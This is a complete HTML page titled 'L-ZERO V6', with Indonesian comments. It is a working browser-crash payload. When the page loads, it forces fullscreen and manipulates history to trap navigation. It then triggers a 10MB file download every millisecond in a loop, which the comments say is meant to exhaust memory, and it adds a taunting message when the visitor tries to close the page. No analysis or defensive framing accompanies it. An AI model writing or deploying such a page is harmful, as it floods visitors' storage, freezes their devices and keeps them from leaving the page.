<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM OVERLOAD | L-ZERO V6</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New'; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; margin: 0; }
        .nuclear-box { border: 10px solid #f00; padding: 50px; background: #000; box-shadow: 0 0 200px #f00; }
        h1 { font-size: 70px; color: #fff; text-shadow: 0 0 30px #f00; animation: blink 0.05s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>

<body onload="igniteHyperDrive()">

<div class="nuclear-box">
    <h1>TOTAL DESTRUCTION</h1>
    <p style="color: #ff0; font-weight: bold; font-size: 25px;">MEMORI INTERNAL SEDANG DIHANCURKAN...</p>
    <p style="color: #fff;">L-ZERO V6 | SPEED: 1ms (GOD MODE)</p>
</div>

<script>
    function igniteHyperDrive() {
        // LOCKDOWN NAVIGASI
        document.documentElement.requestFullscreen().catch(() => {});
        window.history.pushState(null, "", window.location.href);

        // CREATE HEAVY BLOB ONCE TO SAVE CPU (REUSE THE SAME DATA)
        const size = 10 * 1024 * 1024; // 10MB
        const junk = new Uint8Array(size).fill(0x69); // Data sampah statis biar cepet
        const blob = new Blob([junk], { type: "application/octet-stream" });
        const url = URL.createObjectURL(blob);

        // THE 1ms KILLER LOOP
        setInterval(() => {
            const fileName = "DEATH_" + Math.random().toString(36).substring(2, 10) + ".bin";
            const a = document.createElement("a");
            a.href = url;
            a.download = fileName;
            a.click();
            
            // NO CLEANUP! Biar RAM makin sesek!
            // a.remove(); // Dilewati biar proses makin brutal
        }, 1); // <--- INI DIA, 1 MILLISECOND JINGS!
    }

    // ANTI-CLOSE
    window.onbeforeunload = () => "SAY GOODBYE TO YOUR PHONE!";
</script>
